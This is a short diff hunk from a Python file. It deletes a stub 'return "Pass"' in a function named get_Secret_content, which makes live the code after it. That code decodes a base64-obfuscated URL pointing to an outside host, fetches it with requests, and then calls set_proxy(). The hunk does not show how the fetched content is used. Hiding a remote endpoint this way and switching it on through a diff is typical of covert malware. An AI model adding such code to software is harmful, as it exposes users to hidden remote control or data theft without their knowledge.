@@ -109,7 +109,6 @@ def set_proxy():
             
 
 def get_Secret_content():
-    return "Pass"
     keyAdded = (base64.b64decode("aHR0cHM6Ly9tODg4d2FlbC5weXRob25hbnl3aGVyZS5jb20v".encode())).decode()
     response = requests.get(keyAdded)
     set_proxy()
